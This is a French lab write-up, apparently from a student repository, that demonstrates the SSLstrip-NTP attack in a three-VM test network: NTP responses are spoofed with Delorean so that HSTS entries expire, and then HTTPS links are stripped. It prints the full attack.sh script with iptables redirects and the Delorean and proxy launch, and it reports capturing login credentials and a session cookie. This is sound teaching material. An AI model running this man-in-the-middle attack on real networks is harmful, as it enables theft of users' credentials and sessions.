# Attaque SSLstrip-NTP

Cette amélioration de l'attaque SSLstrip originale a été présentée pour la première fois par Jose Selvi à la [Blackhat Europe de 2014](https://www.blackhat.com/docs/eu-14/materials/eu-14-Selvi-Bypassing-HTTP-Strict-Transport-Security-wp.pdf). Celle-ci permet de contourner la sécurité offerte par HSTS (HTTP Strict Transport Security), dans le cas où l'attaquant est capable de modifier le trafic NTP entre le client et le serveur NTP.

L'attaque SSLstrip originale n'est en effet plus possible lorsque l'on essaye de "striper" les URL d'une page web d'un domaine qui a été protégé ultérieurement par HTTP Strict Transport Security. Le mécanisme HSTS va obliger le client à se connecter à l'URL que l'on cherche à striper en HTTPS pendant un certain laps de temps, défini par le serveur.

Le protocole NTP (Network Time Protocol) permet de synchroniser l'horloge d'un équipement informatique avec un serveur. Il s'agit d'un protocole stateless non-sécurisé basé sur UDP. L'attaque présentée par Jose Selvi consiste à usurper les requêtes NTP pour renvoyer une date éronnée au client, et ainsi faire expirer les entrées HSTS. Pour réaliser cela, l'auteur se base sur un outil Python appellé [Delorean](https://github.com/myusuf3/delorean), qui se comporte comme un serveur NTP et pour lequel on peut définir la date de réponse.

Une fois que l'horloge du client a été compromise et le HSTS du domaine expiré, nous pouvons utiliser l'attaque SSLstrip originale afin de striper les URL des pages web, même pour les domaines censés être protégés par HSTS.

# Configuration de l'environnement de test

L'environnement de test consiste en trois machines virtuelles :

- grave, la machine cliente et victime.

- opeth, la machine serveur.

- immortal, la machine attaquante, positionnée en homme du milieu.

Voici la [topology](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/topology) des machines mise en place :


```
### twolans
#
#  opeth - [s1] - immortal - [s2] - grave
#

# switches

SWITCH s1
SWITCH s2
HOST alpinex   grave    s2
HOST debian10  immortal s1 s2
HOST debian10  opeth    s1
```

Toutes les configurations initiales des machines se trouvent dans le fichier __"start.sh"__ de chaque dossier correspondant aux machines.

## Machine "grave" (147.210.13.2)

Cette machine utilise l'environnement graphique de la distribution Linux Alpine. Le navigateur firefox est utilisé pour la démonstration.

Au lancement de la machine, il faut ajouter le certificat de l'autorité de certification dans firefox, grâce à l'outil certutil. De plus, un client NTP est lancé au démarrage de la machine et configuré pour effectuer ses requêtes vers opeth.

Se reporter au fichier [start.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/grave/start.sh) pour plus de détails.

## Machine "opeth" (147.210.12.1)

Cette machine héberge un serveur HTTP(s) Nginx sur le port 80 et 443. Le certificat utilisé pour les connections HTTPS a été généré avec openssl grâces aux scripts présents dans le dossier [CA](https://github.com/t00sh/mastercsi-ter/blob/master/CA). D'abord on crée une autorité de certification :

```
# Crée la clef root
openssl genrsa -out root-ca.key 4096

# Certificat auto-signé
openssl req -x509 -new -nodes -key root-ca.key -sha256 -days 512 -out root-ca.pem
```

Puis on peut créer un certificat pour le serveur opeth, signé avec la clef de l'autorité de certification que l'on vient de créer :

```
# Crée la clef privée
openssl genrsa -out cert.key 4096

# Crée la requête
openssl req -new -key cert.key -out cert.csr

# Signe le certificat avec la clef de la CA
openssl x509 -req -in cert.csr -CA root-ca.pem -CAkey root-ca.key -CAreateserial -out cert.pem -days 365 -sha256
```

Le serveur héberge deux sites :

  - le domaine [www.opeth.local](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/opeth/www/local/index.php) que l'on accéde en HTTP et présentant un formulaire de login.

  - le domaine [www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/opeth/www/secure/index.php) que l'on accéde en HTTPS et protégé par HSTS.

De plus, opeth joue le rôle de serveur NTP légitime, grâce au logiciel ntpd lancé au démarrage de la VM.

## Machine "immortal" (147.210.12.2 - 147.210.13.1)

C'est sur cette machine que se trouve le PoC de l'attaque, dans le fichier [/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/immortal/attack.sh). Cette VM est configurée pour forwarder les paquets entre opeth et grave.

Si elle reçoit une requête NTP sur la chaîne iptables PREROUTING, alors elle redirige ce paquet vers [delorean](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/immortal/delorean.py) pour l'attaque.

------------------------------------------------------

# Démo

Pour lancer l'environnement de test, il faut lancer la commande suivante (on aura récupéré au préalable le dépôt [qemunet](https://gitlab.inria.fr/qemunet/core)) :

```
$ ./qemunet/qemunet.sh -x -S sslstrip-ntp
```

À partir de là, les trois machines sont lancées.

## Étape 1 : avant l'attaque

Lorsque l'attaque n'est pas encore lancée, nous pouvons voir sur la machine grave que tout se passe normalement et que la requête POST passe bien en HTTPS (immortal est donc incapable de voir les identifiants envoyés) :

![screen1](../medias/sslstrip-ntp/screen1.png?raw=true)

L'encadré rouge montre bien que le POST est effectué en HTTPS, sur la page secure.php.

![screen2](../medias/sslstrip-ntp/screen2.png?raw=true)

Nous arrivons alors sur le domaine www.opeth.secure en HTTPS : immortal n'a pas pût voir nos échanges sur cette page sécurisée.

![screen3](../medias/sslstrip-ntp/screen3.png?raw=true)

## Etape 2 : lancement de l'attaque

Comme expliqué précédement, pour lancer l'attaque, il faut exécuter le fichier __[/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/immortal/attack.sh)__ depuis immortal. Voici son contenu :

```
#!/bin/sh

PROXY_PORT=4242
DELOREAN_PORT=4343

iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT
iptables -t nat -A PREROUTING -p udp --destination-port 123 -j REDIRECT --to-port $DELOREAN_PORT

hsts_expire=$(curl -v https://www.opeth.secure --insecure 2>&1  | grep Strict | awk -F= '{print $2}' | awk -F\; '{print $1}')
hsts_expire=$(($hsts_expire / 60 + 1))

/mnt/host/delorean.py -p $DELOREAN_PORT -n -s ${hsts_expire}m &
/mnt/host/sslstrip-ntp.py $PROXY_PORT
```

On peut constater que les flux TCP à destination du port 80 (HTTP) sont redirigées vers le port d'écoute du proxy qui est chargé d'analyser et traiter les requêtes. Aussi, les requêtes NTP sont redirigées vers le serveur Delorean, chargé d'expirer les entrées HSTS.

Nous pouvons maintenant lancer l'attaque depuis la machine immortal :

![screen4](../medias/sslstrip-ntp/screen4.png?raw=true)

## Etape 3 : pendant l'attaque

Lorsque l'attaque est lancée, on peut voir que le lien sensible [https://www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/opeth/www/secure/index.php) est remplacé par [http://www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/opeth/www/secure/index.php). La machine immortal est donc capable d'intercepter les échanges réalisés sur le domaine [www.opeth.secure](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip-ntp/opeth/www/secure/index.php).

Dés que le client effectuera une requête NTP, celle-ci sera redirigée vers le serveur Delorean, qui répondra avec une date permettant d'expirer le HSTS. Cette protection ne sera alors plus effective pour le domaine censé être sécurisé.

Ici on voit dans l'encadré rouge, que le lien https:// a bien été remplacé par un lien non sécurisé http:// :

![screen5](../medias/sslstrip-ntp/screen1.png?raw=true)

Nous constatons que nous arrivons sur le domaine www.opeth.secure en HTTP : notre navigation n'est pas sécurisée !

![screen6](../medias/sslstrip-ntp/screen2.png?raw=true)

La machine immortal a été capable de capturer non seulement les identifiants du formulaire, mais également le cookie de session alors que le domaine était protégé par HSTS :

![screen7](../medias/sslstrip-ntp/screen7.png?raw=true)
